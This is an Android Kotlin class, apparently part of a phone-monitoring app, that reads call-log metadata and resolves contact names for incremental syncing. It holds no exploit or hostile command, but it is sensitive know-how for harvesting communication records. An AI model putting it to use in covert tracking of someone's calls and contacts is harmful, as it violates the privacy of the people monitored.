package com.spapp.monitoring.collectors

import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.provider.BaseColumns
import android.provider.CallLog
import android.provider.ContactsContract
import androidx.core.content.ContextCompat
import com.spapp.monitoring.data.local.CallLogEntry

/** Reads call metadata (number, direction, duration, contact name) — no audio, ever. */
class CallLogCollector(private val context: Context) {

    fun hasPermission(): Boolean =
        ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_CALL_LOG) ==
            PackageManager.PERMISSION_GRANTED

    /**
     * [afterExternalId] == -1 means "never synced before": bootstraps with
     * the most recent [initialBatchSize] calls (by date, descending) — NOT
     * the oldest-first full history — so a phone with years of call history
     * doesn't take dozens of sync cycles to ever reach anything recent. Once
     * bootstrapped, pass the previous batch's max externalId to pick up only
     * genuinely new calls (ordered ascending by row ID, a more reliable
     * watermark than timestamp).
     */
    fun collectSince(afterExternalId: Long, initialBatchSize: Int = 100): List<CallLogEntry> {
        if (!hasPermission()) return emptyList()

        val entries = mutableListOf<CallLogEntry>()
        val projection = arrayOf(
            BaseColumns._ID,
            CallLog.Calls.NUMBER,
            CallLog.Calls.DATE,
            CallLog.Calls.DURATION,
            CallLog.Calls.TYPE,
            CallLog.Calls.CACHED_NAME
        )

        val (selection, selectionArgs, sortOrder, cap) = if (afterExternalId < 0) {
            Quad(null, null, "${CallLog.Calls.DATE} DESC", initialBatchSize)
        } else {
            Quad("${BaseColumns._ID} > ?", arrayOf(afterExternalId.toString()), "${BaseColumns._ID} ASC", 500)
        }

        context.contentResolver.query(CallLog.Calls.CONTENT_URI, projection, selection, selectionArgs, sortOrder)
            ?.use { cursor ->
                // Not every OEM's CallLog/Sms provider accepts a "LIMIT" token in the
                // sortOrder string (some throw IllegalArgumentException) — cap in-memory instead.
                val idIdx = cursor.getColumnIndex(BaseColumns._ID)
                val numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER)
                val dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE)
                val durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION)
                val typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE)
                val nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)

                while (cursor.moveToNext() && entries.size < cap) {
                    val externalId = cursor.getLong(idIdx)
                    val number = cursor.getString(numberIdx) ?: "unknown"
                    val date = cursor.getLong(dateIdx)
                    val duration = cursor.getInt(durationIdx)
                    val type = cursor.getInt(typeIdx)
                    val cachedName = if (nameIdx >= 0) cursor.getString(nameIdx) else null
                    val contactName = resolveContactName(number, cachedName)

                    val direction = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE -> "missed"
                        else -> "incoming"
                    }

                    entries += CallLogEntry(
                        direction = direction,
                        counterparty = number,
                        durationSec = duration,
                        calledAtEpochMs = date,
                        externalId = externalId,
                        contactName = contactName
                    )
                }
            }
        return entries
    }

    private fun resolveContactName(number: String, cachedName: String?): String? {
        if (!cachedName.isNullOrBlank()) return cachedName.trim()
        if (number.isBlank() || number == "unknown" || number == "-1" || number == "-2") return null
        try {
            val uri = Uri.withAppendedPath(
                ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(number)
            )
            context.contentResolver.query(
                uri,
                arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME),
                null,
                null,
                null
            )?.use { c ->
                if (c.moveToFirst()) {
                    val idx = c.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME)
                    if (idx >= 0) {
                        val name = c.getString(idx)
                        if (!name.isNullOrBlank()) return name.trim()
                    }
                }
            }
        } catch (_: Exception) {
            // Contacts lookup fallback
        }
        return null
    }

    private data class Quad(
        val selection: String?,
        val selectionArgs: Array<String>?,
        val sortOrder: String,
        val cap: Int
    )
}
